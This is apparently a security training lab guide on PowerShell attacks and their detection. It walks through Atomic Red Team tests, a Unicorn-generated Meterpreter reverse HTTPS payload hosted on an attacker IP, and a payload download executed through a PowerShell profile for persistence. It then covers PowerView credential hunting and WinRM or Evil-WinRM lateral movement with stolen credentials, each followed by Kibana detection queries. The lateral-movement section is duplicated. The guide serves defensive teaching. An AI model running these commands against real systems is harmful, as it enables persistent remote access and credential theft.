Atomic Red Team
Testing a system's environment for PowerShell execution is one way to determine whether the system and user account are susceptible to attacks that weaponize PowerShell. These types of attacks use the PowerShell framework and ecosystem for exploitation, persistence, and lateral movement.

﻿

Atomic Red Team is a powerful tool for performing these types of tests. This tool works just as well on individual systems as it does across an enterprise, which may need it.

﻿

This lab will utilize Atomic Red Team to test for vulnerabilities associated with MITRE ATT&CK Technique T1059.001 - Command and Scripting Interpreter: PowerShell.

﻿

Using Atomic Red Team
﻿

Employ the Atomic Red Team framework to test the PowerShell functions in an environment that are allowed by existing policies and controlled. These functions may be used by an attacker.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) eng-wkstn-1 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Powershell as an Administrator.

﻿

3. Display the list of available PowerShell execution tests by entering the following command:

﻿

Invoke-AtomicTest T1059.001 -ShowDetailsBrief
﻿

4. Some of these tests are built into the Atomic Red Team framework, while others may have additional requirements such as third party scripts, libraries, or executables. Check the prerequisites for these tests by entering the following command:

Invoke-AtomicTest T1059.001 -CheckPrereqs

﻿

Observe that some of the tests failed the prerequisite checks. This is not uncommon and indicates that certain tests will not run properly due to missing requirements. All the other tests will still run successfully.

﻿

5. Run the tests with the following command:

Invoke-AtomicTest T1059.001
﻿

Executing the command in step 5 runs four sets of tests for assessing tools and techniques in the following categories:

Set 1: Downloaded scripts
Set 2: Security controls bypasses
Set 3: Spawning
Set 4: Known malicious cmdlets
The first set of tests determine whether script-based tools may be downloaded from an external network to run on the local machine. These tools may include Mimikatz from the PowerSploit framework or Bloodhound ingestors. The second set of tests determine whether certain User Access Control (UAC), security, and code execution bypasses are successful in the environment. These bypasses include the following:

Mshta
Extensible Markup Language (XML)
XML Component Object Model (COM) object
Fileless script execution
PowerShell Downgrade
Alternate Data Streams (ADS) access
The third set of tests determine whether PowerShell can spawn other PowerShell sessions. The fourth and final set of tests determine whether certain known malicious cmdlets are allowed to run in the environment. This includes the malicious cmdlets from the PowerSploit framework that malicious parties frequently use in their attacks.

﻿

A successful result on an Atomic test indicates a security hole in the mission partner infrastructure. These vulnerabilities must be addressed through security controls, group policy restrictions, and strict configurations. Prolific logging is also essential for capturing any threat exploitation that cannot be sufficiently mitigated.


Persistence with PowerShell Profiles
PowerShell is useful for executing persistence methods such as adding scheduled tasks and creating new registry values. PowerShell can also install new services that establish a persistent connection back to a malicious command and control server. Another common method of establishing persistence with PowerShell is to manipulate a user's PowerShell profile. A profile is the script that runs automatically when a session is constructed to personalize the environment. Since profiles are scripts, additional commands and code may be added to them.

﻿

Complete the following set of labs to create a Unicorn payload, establish persistence in the PowerShell profile, and detect PowerShell profile persistence.

﻿

Create a Unicorn Payload
﻿

Add persistent functionality to the user’s PowerShell profile with the PowerShell persistence creation tool Unicorn. Then, examine machine logs in Kibana to view the defender’s perspective of this malicious activity. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window.

﻿

3. Change directories to the Unicorn directory by entering the following code:

(trainee@dmss-kali)-[~]$cd /home/trainee/unicorn
﻿

4. Generate the Metasploit setup script and PowerShell shellcode that creates a persistent reverse HTTPS shell by entering the following command:

(trainee@dmss-kali)-[~/unicorn]$ ./unicorn.py windows/meterpreter/reverse_https 199.63.64.51 5555
﻿

The command from this step creates the files powershell_attack.txt and unicorn.rc, as displayed in Figure 12.1-1, below:

﻿

﻿

﻿Figure 12.1-1﻿

﻿

If the attack command in powershell_attack.txt is placed in the PowerShell profile in its current state, it will create an unacceptable loop. To resolve this, the flag -noprofile must be manually added to the code. 

﻿

5. Ensure that child PowerShell processes run without the profile enabled by running the following command:

(trainee@dmss-kali)-[~/unicorn]$ sed -z -i 's/\n/\r\n/g;s/powershell/powershell -noprofile/g' powershell_attack.txt
﻿

6. Display the commands to add to the PowerShell profile by printing the contents of the file powershell_attack.txt.

﻿

This file will be downloaded to the victim device.

﻿

7. Start a listener with the following command:

(trainee@dmss-kali)-[~/unicorn]$ sudo msfconsole -r unicorn.rc
[sudo] password for trainee: CyberTraining1!
﻿

8﻿. In a separate window, change directories to the Unicorn directory by entering the following code:

(trainee@dmss-kali)-[~]$cd /home/trainee/unicorn
﻿

9. Host the file powershell_attack.txt in an ad hoc Python web server to transfer it to the target by executing the following command:

(trainee@jdmss-kali)-[~/unicorn]$ python3 -m http.server
﻿

﻿

Establish Persistence in the PowerShell Profile
﻿

Having created a persistence payload with Unicorn, emulate an attacker with access to a victim Windows machine in the mission partner network in order to place the payload in the PowerShell Profile that is loaded when a user initiates a PowerShell session. 

﻿

Workflow
﻿

1. Log in to the VM eng-wkstn-1 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a PowerShell terminal.

﻿

3. Determine whether the current user has an active PowerShell profile and its path by entering the following command:

PS C:\Users\trainee> echo $profile
﻿

NOTE: The file from step 3 may not be visible in the file explorer. The folder WindowsPowerShell in a user’s documents is hidden by default.

﻿

4. Test whether this profile exists by entering the following command:

PS C:\Users\trainee> Test-Path $profile
﻿

The profile does not exist, so the document will need to be created.

﻿

5. Create a profile for the current user with the following command:

PS C:\Users\trainee> New-Item -Path $profile -Type file -Force
﻿

6. Create a file for the Unicorn payload by entering the following:

PS C:\Users\trainee> New-Item -Path "C:\Windows\Temp\launch.bat" -Type file -Force
﻿

7. Retrieve the payload from the malicious server by entering the following command:

PS C:\Users\trainee> (Invoke-webrequest -URI "http://199.63.64.51:8000/powershell_attack.txt").Content | Out-File -FilePath "C:\Windows\Temp\launch.bat"
﻿

An attacker completes this file transfer activity during an active session, before leaving the machine. This ensures the attacker has continued access.

﻿

8. Prepare the persistence command to add to the profile by entering the following:

PS C:\Users\trainee> $string = 'Start-Process -FilePath "powershell" -ArgumentList "-noprofile -command `"IEX(GC C:\Windows\Temp\launch.bat -Raw)`""'
﻿

9. Add the command to the profile with the following command:

PS C:\Users\trainee> $string | Out-File -FilePath $profile -Append
﻿

10. Type exit to close the current PowerShell session and open a new session to trigger the persistence.

﻿

11. Return to the VM kali-hunt to view the new session that is created.

﻿

Since the persistence is triggered by opening a PowerShell session, an attacker can now maintain access to the machine, but this technique is not invisible. Evidence of such unusual activity may be visible in system logs if the mission partner has enabled the appropriate logging and threat detection mechanisms.

﻿

Detect PowerShell Profile Persistence
﻿

Move to the VM win-hunt to display the traces of persistence in the logs located on a central SIEM.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials

Username: trainee
Password: CyberTraining1!
﻿

2. Open the bookmark for Discover - Elastic in the browser Chrome and enter the following credentials when prompted:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. Find evidence of PowerShell processes created by other PowerShell processes by entering the following search terms in the query bar:

event.code:1 and process.executable :*powershell.exe and process.parent.executable :*powershell.exe
﻿

The command line of the process created in step 3 is the persistence command that was downloaded from the malicious machine. Figure 12.1-2, below, displays the plaintext malicious payload that the Unicorn tool created. This type of code is unusual when compared to the normal administrative functions that a Windows system administrator might employ PowerShell to do. It is even more unusual as an automatic block of code executed at the beginning of every PowerShell session.

﻿

﻿

Figure 12.1-2﻿

﻿

This series of labs features techniques of building a persistence method into the PowerShell profile and then searching for processes spawned unexpectedly from PowerShell. An example of the Indicators of Compromise (IOC) to hunt for in these situations include a new PowerShell session running in the background, such as the one from this lab.

﻿

Click "Continue" to proceed to the next task.
Auto-Advance on Correct




PowerSploit
PowerSploit is a set of attack tools that are written in PowerShell. These tools provide advanced reconnaissance, exploitation, privilege escalation, persistence, and lateral movement functionality to an attacker. However, before attackers can use PowerSploit, they must first bring the tools into an environment and execute them. 

﻿

Use PowerSploit
﻿

Access the attacker’s workstation again to employ this powerful toolkit written in PowerShell for local enumeration and reconnaissance on a compromised machine. The PowerSploit tools are already on the Kali machine. An attacker would simply need to execute a file upload to the victim workstation to execute them. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Bring up the Metasploit session created from the persistence established in previous labs by entering the following command:

msf6 exploit(multi/handler) > sessions -i 1
﻿

NOTE: if the previous session is closed, trigger the persistence again by executing the following command in a Kali terminal window and opening a new PowerShell session on the victim machine:

(trainee@dmss-kali)-[~/unicorn]$ sudo msfconsole -r unicorn.rc
[sudo] password for trainee: CyberTraining1! 
﻿

3. Load the application interface that allows the creation of an interactive shell by entering the following command:

meterpreter > load stdapi
﻿

4. Transfer the PowerSploit toolkit to the victim device with the following command:

meterpreter > upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "C:\Windows\Temp\PowerView.ps1"
﻿

5. Enter an interactive shell on the machine by entering the following:

meterpreter > shell
﻿

6. Load the PowerSploit PowerView functions by running the following series of commands:

C:\Users\trainee> powershell
﻿

PS C:\Users\trainee> Set-ExecutionPolicy Bypass
﻿

PS C:\Users\trainee> cd C:\Windows\Temp\
﻿

PS C:\Windows\Temp> . .\PowerView.ps1
﻿

The commands from step 6 enable reconnaissance on the exploited machine to find any information that is useful for future phases of the attack.

﻿

7. Search for any credentials left on the machine with the following PowerView function:

PS C:\Windows\Temp> Find-InterestingFile -Path "C:\Users"
﻿

Parsing through the output displays the entry in Figure 12.1-3, below:

﻿

﻿

Figure 12.1-3﻿

﻿

8. Print the contents of the file backup_pass.txt with the following command:

PS C:\Windows\Temp> Get-Content C:\Users\trainee\Documents\backup_pass.txt
﻿

The file, as displayed in Figure 12.1-4, presents a username and password that will be used later in this lesson in an attack lifecycle for lateral movement.

﻿

﻿

Figure 12.1-4﻿

﻿

9. Switch to the VM win-hunt and enter the following credentials to hunt for traces of the PowerSploit tools:

Username: trainee
Password: CyberTraining1!
﻿

10. Open Kibana in the browser Chrome and enter the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

11. Detect the tool activity in their out-of-the-box form by running the following query:

event.code:4104 and message:"*PowerView*"
﻿

Event 4104 is the Windows PowerShell operational log code for script execution. Executing a script logs the contents with this code, so that it can be examined later. Since the PowerView module was loaded to define and access its functions, that activity is viewable in the Event 4104 logs. Entire sections of the script are visible in the logs if the log document is opened in a separate window and the message is expanded. Figure 12.1-5, below, displays how the PowerView module code is visible in the log:

﻿

﻿

Figure 12.1-5﻿

﻿

In the query from the previous step, PowerView may be replaced with any of the other PowerSploit tools. Include each tool's name when writing detection rules.

﻿

If script block logging is turned on, the contents of the Windows PowerShell Operational log provides details about what the PowerSploit scripts run. However, these logs can take up a significant amount of disk space, especially if there are a great deal of automated PowerShell actions occurring in the background of each system. The best practice for maintaining visibility while conserving space is to roll these logs regularly while setting up alerts to catch suspicious activity in a timely manner. One of the strongest mitigations of this toolset is to disable the execution of external scripts in the mission partner environment. 

﻿

Click "Continue" to proceed to the next task.
Auto-Advance on C





Lateral Movement through WinRM
After a malicious threat actor obtains credentials during the enumeration phase of an operation, the actor has multiple options for how to proceed. One way to leverage the credentials is for lateral movement through PowerShell’s Remote Management feature. This feature is also known as WinRM. 

﻿

Use WinRM
﻿

Emulate how an attacker might use the WinRM service to access machines lateral to a compromised device for which the attacker has obtained credentials. This emulation may occur by using the tool Evil-WinRM available on the machine Kali or through PowerShell’s built-in cmdlet Invoke-Command, which operates over the WinRM protocol.

﻿

Workflow
﻿

1. Log in to the VM eng-wkstn-1 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a PowerShell terminal.

﻿

3. Create a remote PowerShell session through the WinRM protocol to the neighboring workstation eng-wkstn-2, by entering the following commands that include the credentials previous captured:

$credentials = Get-Credential
	Username: energy\john.doe
	Password: Password1998!@#
$session = New-PSSession -ComputerName eng-wkstn-2 -Credential $credentials
Enter-PSSession $session
﻿

Step 3 creates an interactive session on a different device in the network. The next step is to view evidence of this activity.

﻿

4. Return to the VM win-hunt to view any evidence of the activity that may be available.

﻿

5. Open the bookmark for Kibana Discover - Elastic in the browser Chrome and enter the following credentials if prompted:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

6. Determine whether explicit credentials were used for a logon in the logs shipped to Elastic by entering the following query:

event.code: 4648 and winlog.event_data.TargetInfo:HTTP*
﻿

This returns all records that explicitly supply credentials to conduct network logons to the HTTP service of a workstation. HTTP is the protocol over which WinRM communicates. WinRM uses either the alternative port 5985 or 5986 when using the HTTPS version of WinRM.

﻿

If an attacker records those credentials separately and moves laterally from a different endpoint, the WinRM activity may still be monitored from the receiving host. The tool Evil-WinRM is available on the VM kali-hunt for this demonstration.

﻿

7. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

8. Open a terminal window.

﻿

9. Use Evil-WinRM to log on to the VM eng-wkstn-2 with the stolen credentials by running the following command:

evil-winrm -i 172.16.4.3 -u "john.doe"
﻿

When prompted for the password, use:

Password1998!@#
﻿

Step 9 creates another interactive session, as displayed in Figure 12.1-6, below:

![image](https://github.com/user-attachments/assets/0aa2baeb-0281-4ab7-bfd2-d0ea932d5388)

10. Return to the VM win-hunt.


11. Return to the previously-opened Kibana Discover tab in Chrome. 


12. Search for the WinRM resource allocation event with the following query:
event.code: 91



These events are shipped to Elastic from the log Microsoft-Windows-WinRM/Operational. The Winlogbeat configurations in the mission partner environment may need to be modified to include these logs.


The following event codes also contain information about the login, such as the username and logon type:
4624 - denotes a successful logon.
4672 - indicates special privileges that are assigned at logon.



In this lab, logon type 3 indicates a network logon rather than a local interactive logon.


The following query is also useful for finding suspicious activity:
event.code: 4624 and winlog.event_data.LogonType:3



However, this query must be vetted to understand which logons are part of routine scripted administrative activity and which ones are done by users which ordinarily do not perform remote logins.


Lateral Movement through WinRM
After a malicious threat actor obtains credentials during the enumeration phase of an operation, the actor has multiple options for how to proceed. One way to leverage the credentials is for lateral movement through PowerShell’s Remote Management feature. This feature is also known as WinRM. 

﻿

Use WinRM
﻿

Emulate how an attacker might use the WinRM service to access machines lateral to a compromised device for which the attacker has obtained credentials. This emulation may occur by using the tool Evil-WinRM available on the machine Kali or through PowerShell’s built-in cmdlet Invoke-Command, which operates over the WinRM protocol.

﻿

Workflow
﻿

1. Log in to the VM eng-wkstn-1 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a PowerShell terminal.

﻿

3. Create a remote PowerShell session through the WinRM protocol to the neighboring workstation eng-wkstn-2, by entering the following commands that include the credentials previous captured:

$credentials = Get-Credential
	Username: energy\john.doe
	Password: Password1998!@#
$session = New-PSSession -ComputerName eng-wkstn-2 -Credential $credentials
Enter-PSSession $session
﻿

Step 3 creates an interactive session on a different device in the network. The next step is to view evidence of this activity.

﻿

4. Return to the VM win-hunt to view any evidence of the activity that may be available.

﻿

5. Open the bookmark for Kibana Discover - Elastic in the browser Chrome and enter the following credentials if prompted:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

6. Determine whether explicit credentials were used for a logon in the logs shipped to Elastic by entering the following query:

event.code: 4648 and winlog.event_data.TargetInfo:HTTP*
﻿

This returns all records that explicitly supply credentials to conduct network logons to the HTTP service of a workstation. HTTP is the protocol over which WinRM communicates. WinRM uses either the alternative port 5985 or 5986 when using the HTTPS version of WinRM.

﻿

If an attacker records those credentials separately and moves laterally from a different endpoint, the WinRM activity may still be monitored from the receiving host. The tool Evil-WinRM is available on the VM kali-hunt for this demonstration.

﻿

7. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

8. Open a terminal window.

﻿

9. Use Evil-WinRM to log on to the VM eng-wkstn-2 with the stolen credentials by running the following command:

evil-winrm -i 172.16.4.3 -u "john.doe"
﻿

When prompted for the password, use:

Password1998!@#
﻿

Step 9 creates another interactive session, as displayed in Figure 12.1-6, below:

﻿

﻿

Figure 12.1-6﻿

﻿

10. Return to the VM win-hunt.

﻿

11. Return to the previously-opened Kibana Discover tab in Chrome. 

﻿

12. Search for the WinRM resource allocation event with the following query:

event.code: 91
﻿

These events are shipped to Elastic from the log Microsoft-Windows-WinRM/Operational. The Winlogbeat configurations in the mission partner environment may need to be modified to include these logs.

﻿

The following event codes also contain information about the login, such as the username and logon type:

4624 - denotes a successful logon.

4672 - indicates special privileges that are assigned at logon.

﻿

In this lab, logon type 3 indicates a network logon rather than a local interactive logon.

﻿

The following query is also useful for finding suspicious activity:

event.code: 4624 and winlog.event_data.LogonType:3
﻿

However, this query must be vetted to understand which logons are part of routine scripted administrative activity and which ones are done by users which ordinarily do not perform remote logins.

﻿
























































































































































